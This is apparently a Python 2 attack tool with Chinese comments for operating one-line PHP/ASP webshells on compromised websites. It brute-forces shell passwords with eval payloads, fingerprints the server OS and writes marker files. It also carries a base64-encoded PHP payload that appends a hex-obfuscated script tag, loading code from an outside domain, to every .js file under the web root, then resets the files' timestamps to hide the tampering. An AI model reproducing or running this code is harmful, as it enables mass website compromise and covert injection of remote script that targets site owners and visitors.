#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import threading
import Queue
import time
import urllib2
import urllib
import re,httplib
import gzip,StringIO
import socket
socket.setdefaulttimeout(10)

import sys
reload(sys)
sys.setdefaultencoding('utf-8')

#PHP  挂载JS
data_base64="c2V0X3RpbWVfbGltaXQoOTk5OSk7ICAKZnVuY3Rpb24gZmlsZV9hZGQoJGZpbGUpIAp7Cgl0cnkKCXsKCQlnbG9iYWwgJGRhdGE7IAoJCSRhPWZpbGVtdGltZSgkZmlsZSk7IAoJCSRmcD1mb3BlbigkZmlsZSwiYSsiKTsKCQlmcHV0cygkZnAsJGRhdGEpOwoJCWZjbG9zZSgkZnApOwoJCWVjaG8gJGZpbGUuIi0tLWErIGxpbmsgZmlsZSBva1xyXG48YnI+IjsgCgkJdHJ5CgkJewoJCQlpZih0b3VjaCgkZmlsZSwkYSwkYSkpCgkJCXsKCQkJZWNobyAkZmlsZS4idXBkYXRlIGZpbGUgdGltZSBva1xyXG48YnI+IjsgCgkJCWVjaG8gIi0tLS0tLS0tXHJcbjxicj4iOyAKCQkJfWVsc2V7CgkJCWVjaG8gJGZpbGUuInVwZGF0ZSBmaWxlIHRpbWUgdHJ5LWVycm9yXHJcbjxicj4iOyAKCQkJZWNobyAiLS0tLS0tLS1cclxuPGJyPiI7IAoJCQl9CgkJfQoJCWNhdGNoKEV4Y2VwdGlvbiAkZSkKCQl7IAoJCX0KCX0KCWNhdGNoKEV4Y2VwdGlvbiAkZSkKCXsgCgllY2hvICRlLiJ1cGRhdGUgZmlsZSBlcnJvclxyXG48YnI+IjsgCglyZXR1cm4gMDsKCX0KfQoKZnVuY3Rpb24gZm9yX2ZpbGUoJHBhdGgpCnsKCXRyeQoJewoJCSRkID1AZGlyKCIkcGF0aCIpOwoJCXdoaWxlIChmYWxzZSAhPT0gKCRlbnRyeSA9ICRkLT5yZWFkKCkpKSAKCQl7CgkJCWlmKCRlbnRyeSA9PSAiLiIgfHwgJGVudHJ5ID09ICIuLiIpIGNvbnRpbnVlOwoJCQkkZmlsZT0kZC0+cGF0aC4iLyIgLiRlbnRyeTsKCQkJaWYoQGlzX2RpcigkZmlsZSkpIAoJCQl7CgkJCWZvcl9maWxlKCRmaWxlKTsKCQkJfQoJCQllbHNlCgkJCXsKCQkJaWYoQGVyZWcoIi5qcyIsJGZpbGUpKSAKCQkJewoJCQllY2hvICJmaW5kIGZpbGVzOiIuJGZpbGUuIlxyXG48YnI+IjsKCQkJZmlsZV9hZGQoJGZpbGUpOwoJCQl9CgkJCX0KCQl9CgkJJGQtPmNsb3NlKCk7CgkJcmV0dXJuIDE7Cgl9CgljYXRjaChFeGNlcHRpb24gJGUpCgl7IAoJZWNobyAkZS4iZm9yIHdlYiBkaXIgZXJyb3JcclxuPGJyPiI7IAoJcmV0dXJuIDA7Cgl9Cn0KCgpoZWFkZXIoIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWdiayIpOwokQlk9IlVWRXlOakF5TVRVNU9UUTIiOwoKaW5pX3NldCgiZGF0ZS50aW1lem9uZSIsIkFzaWEvQ2hvbmdxaW5nIik7CkAkdGltMj1kYXRlKCdZLW0tZCBIOmk6cycsdGltZSgpKTsKZWNobyAidGltZToiLiR0aW0yLiJcclxuPGJyPiI7Cgokcm9vdF93ZWI9JF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsgICAKZWNobyAic3RhcnQgZmlsZToiLiRyb290X3dlYi4iXHJcbjxicj4iOwplY2hvICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxyXG48YnI+IjsKCmdsb2JhbCAkZGF0YTE7CiRkYXRhPSJcbnZhciBfJD1bJ1xceDNjXFx4NzNcXHg2M1xceDcyXFx4NjlcXHg3MFxceDc0XFx4MjBcXHg3NFxceDc5XFx4NzBcXHg2NVxceDNkXFx4MjJcXHg3NFxceDY1XFx4NzhcXHg3NFxceDJmXFx4NmFcXHg2MVxceDc2XFx4NjFcXHg3M1xceDYzXFx4NzJcXHg2OVxceDcwXFx4NzRcXHgyMlxceDIwXFx4NzNcXHg3MlxceDYzXFx4M2RcXHgyMlxceDY4XFx4NzRcXHg3NFxceDcwXFx4M2FcXHgyZlxceDJmXFx4NzdcXHg3N1xceDc3XFx4MmVcXHg3N1xceDY1XFx4NjJcXHg3M1xceDYzXFx4NjFcXHg2ZVxceDMxXFx4MzlcXHgzOFxceDM5XFx4MmVcXHg3NVxceDczXFx4MmZcXHg1NFxceDRmXFx4NGRcXHgyZlxceDY5XFx4NzBcXHgyZVxceDcwXFx4NjhcXHg3MFxceDIyXFx4M2VcXHgzY1xceDJmXFx4NzNcXHg2M1xceDcyXFx4NjlcXHg3MFxceDc0XFx4M2UnXTtkb2N1bWVudC53cml0ZSggXyRbMF0pOyI7Cgpmb3JfZmlsZSgkcm9vdF93ZWIpOyA="

#PHP 往WEB  目录下写文件
php_file_txt_base64="ZnVuY3Rpb24gZmlsZV9hZGQoJGZpbGVfbmFtZSwkZmlsZV9kYXRhKSAgCnsKJGZwPWZvcGVuKCRmaWxlX25hbWUsInciKTsKZnB1dHMoJGZwLCRmaWxlX2RhdGEpOwpmcHV0cygkZnAsIlxyXG4iKTsKZmNsb3NlKCRmcCk7CmVjaG8gImxvbmciOwp9CgpkZWZpbmUoJ0JBU0VfUEFUSCcsc3RyX3JlcGxhY2UoJ1xcJywnLycscmVhbHBhdGgoZGlybmFtZShfX0ZJTEVfXykuJy8nKSkuIi8iKTsKCmZpbGVfYWRkKEJBU0VfUEFUSC4id2ViLnR4dCIsImxvbmciKTs="

class C_YJH(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def yijuhua_cs(self,asp_php,url,PASS): #ASP还是PHP  ,URL地址 ，密码
        try:
            #选择扫描方式
            if asp_php == "":
                asp_php = "php"
            if asp_php == "asp":
                params = "=execute(\"response.clear:response.write(\"\"jinlaile\"\"):response.end\")"
            elif asp_php == "php":
                #params = "=@eval($_POST[\"echo(\"jinlaile\");die();\"]);"
                params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
            else:
                params = "=Response.Clear();Response.Write(\"jinlaile\");"
                #构造HTTP头
            pattern = re.compile('http:*')
            match = pattern.search(url)
            if(match):
                ztarget = url.replace("http://","").split('/')[0]
                headers={"Host": ztarget,\
                         "User-Agent": "Mozilla/5.0",\
                         "Content-Type": "application/x-www-form-urlencoded",\
                         "Referer": "http://"+ztarget
                }
            else:
                #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
                return 0
                #测试  链接
            conn = httplib.HTTPConnection(ztarget)
            params = PASS+params
            try:
                conn.request(method="POST",url=url,body=params,headers=headers)
                response = conn.getresponse()
                if ('content-encoding', 'gzip') in response.getheaders():
                    compressedstream = StringIO.StringIO(response.read())
                    gzipper = gzip.GzipFile(fileobj=compressedstream)
                    data = gzipper.read()
                else:
                    data = response.read()
                if(data.find("jinlaile") >= 0):
                    #print "!!!!----PASS FIND!!! -------------->"+PASS
                    return 1
                    #os._exit(1)
            except Exception,e:
                #print e
                return 0

        except Exception,e:
            #print e
            return 0

    def yijuhua_win_linux(self,url,PASS): #URL地址 ，密码   返回操作系统
        try:
            #选择扫描方式
            #params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="

            params = "=echo PHP_OS;"
            #构造HTTP头
            pattern = re.compile('http:*')
            match = pattern.search(url)
            if(match):
                ztarget = url.replace("http://","").split('/')[0]
                headers={"Host": ztarget,\
                         "User-Agent": "Mozilla/5.0",\
                         "Content-Type": "application/x-www-form-urlencoded",\
                         "Referer": "http://"+ztarget
                }
            else:
                #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
                return 0
                #测试  链接
            conn = httplib.HTTPConnection(ztarget)
            params = PASS+params
            try:
                conn.request(method="POST",url=url,body=params,headers=headers)
                response = conn.getresponse()
                if ('content-encoding', 'gzip') in response.getheaders():
                    compressedstream = StringIO.StringIO(response.read())
                    gzipper = gzip.GzipFile(fileobj=compressedstream)
                    data = gzipper.read()
                else:
                    data = response.read()
                if "WINNT" in data:
                    return "WINNT"
                if "Linux" in data:
                    return "Linux"
                if "FreeBSD" in data:
                    return "FreeBSD"
                return "null"
            except Exception,e:
                #print e
                return 0
        except Exception,e:
            #print e
            return 0

    def yijuhua_php_js(self,url,PASS): #URL地址 ，密码   只支持PHP
        try:
        #params = "=@eval($_POST[\"echo(\"jinlaile\");die();\"]);"
        #params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
            params = "=@eval(base64_decode($_POST[z0]));&z0=%s"%(urllib.quote(data_base64))
            #构造HTTP头
            pattern = re.compile('http:*')
            match = pattern.search(url)
            if(match):
                ztarget = url.replace("http://","").split('/')[0]
                headers={"Host": ztarget,\
                         "User-Agent": "Mozilla/5.0",\
                         "Content-Type": "application/x-www-form-urlencoded",\
                         "Referer": "http://"+ztarget
                }
            else:
                #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
                return 0
                #测试  链接
            conn = httplib.HTTPConnection(ztarget)
            params = PASS+params
            try:
                #print params
                conn.request(method="POST",url=url,body=params,headers=headers)
                response = conn.getresponse()
                if ('content-encoding', 'gzip') in response.getheaders():
                    compressedstream = StringIO.StringIO(response.read())
                    gzipper = gzip.GzipFile(fileobj=compressedstream)
                    data = gzipper.read()
                else:
                    data = response.read()
                    return data
                return data
            except Exception,e:
                #print e
                return 0
        except Exception,e:
            #print e
            return 0

    def yijuhua_php_web_file(self,url,PASS): #URL地址 ，密码   往WEB目录下写文件
        try:
            params = "=@eval(base64_decode($_POST[z0]));&z0=%s"%(urllib.quote(php_file_txt_base64))
            #构造HTTP头
            pattern = re.compile('http:*')
            match = pattern.search(url)
            if(match):
                ztarget = url.replace("http://","").split('/')[0]
                headers={"Host": ztarget,\
                         "User-Agent": "Mozilla/5.0",\
                         "Content-Type": "application/x-www-form-urlencoded",\
                         "Referer": "http://"+ztarget
                }
            else:
                #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
                return 0
                #测试  链接
            conn = httplib.HTTPConnection(ztarget)
            params = PASS+params
            try:
                #print params
                conn.request(method="POST",url=url,body=params,headers=headers)
                response = conn.getresponse()
                if ('content-encoding', 'gzip') in response.getheaders():
                    compressedstream = StringIO.StringIO(response.read())
                    gzipper = gzip.GzipFile(fileobj=compressedstream)
                    data = gzipper.read()
                else:
                    data = response.read()
                if(data.find("long") >= 0):
                    #print "!!!!----PASS FIND!!! -------------->"+PASS
                    return 1
                    #os._exit(1)
            except Exception,e:
                #print e
                return 0
        except Exception,e:
            #print e
            return 0

    def open_url_read(self,url):  #返回页面内容
        try:
            req = urllib2.Request(url)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            s = urllib2.urlopen(req,timeout=10)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            return s.read()
        except:
            return 0

    def URL_DZ(self,data,re_data):  #遍历页里的地址
        try:
            p = re.compile(re_data)
            sarr = p.findall(data)
            if len(sarr)>=1:
                return 1
            return 0
        except:
            return 0

